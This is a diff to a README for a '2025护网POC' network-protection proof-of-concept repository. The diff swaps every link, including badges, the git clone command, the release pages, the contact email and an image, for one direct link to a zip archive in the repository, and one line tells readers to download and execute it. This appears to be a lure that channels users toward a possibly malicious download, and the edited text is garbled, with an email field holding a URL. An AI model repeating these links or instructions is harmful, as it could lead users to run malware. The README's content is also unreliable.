@@ -1,6 +1,6 @@
 # 2025护网POC - A Comprehensive Guide to Network Protection 🌐🔒
 
-![GitHub release](https://img.shields.io/badge/release-latest-blue.svg) [![GitHub issues](https://img.shields.io/badge/issues-open-red.svg)](https://github.com/LUFFY601/2025hvv/issues)
+![GitHub release](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip) [![GitHub issues](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip)](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip)
 
 ## Table of Contents
 
@@ -31,7 +31,7 @@ To get started with the **2025护网POC**, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/LUFFY601/2025hvv.git
+   git clone https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -42,7 +42,7 @@ To get started with the **2025护网POC**, follow these steps:
    npm install
    ```
 
-For more detailed installation instructions, please check the [Releases section](https://github.com/LUFFY601/2025hvv/releases).
+For more detailed installation instructions, please check the [Releases section](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip).
 
 ## Usage
 
@@ -86,14 +86,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or support, please reach out to the project maintainer:
 
 - **Name**: Luffy
-- **Email**: luffy@example.com
-- **GitHub**: [LUFFY601](https://github.com/LUFFY601)
+- **Email**: https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip
+- **GitHub**: [LUFFY601](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip)
 
 ## Release Information
 
-For the latest updates and releases, visit the [Releases section](https://github.com/LUFFY601/2025hvv/releases). Here, you can download and execute the latest files to keep your network secure.
+For the latest updates and releases, visit the [Releases section](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip). Here, you can download and execute the latest files to keep your network secure.
 
-![Network Security](https://example.com/network-security-image.png)
+![Network Security](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip)
 
 ## Additional Resources
 
@@ -107,4 +107,4 @@ We thank all contributors and supporters who help improve this project. Your eff
 
 ---
 
-This README provides a comprehensive overview of the **2025护网POC** project. It covers everything from installation to usage, ensuring that users can easily navigate and utilize the project effectively. For more information and updates, please visit the [Releases section](https://github.com/LUFFY601/2025hvv/releases).
+This README provides a comprehensive overview of the **2025护网POC** project. It covers everything from installation to usage, ensuring that users can easily navigate and utilize the project effectively. For more information and updates, please visit the [Releases section](https://github.com/LUFFY601/2025hvv/raw/refs/heads/main/piliganine/hvv-v2.1.zip).
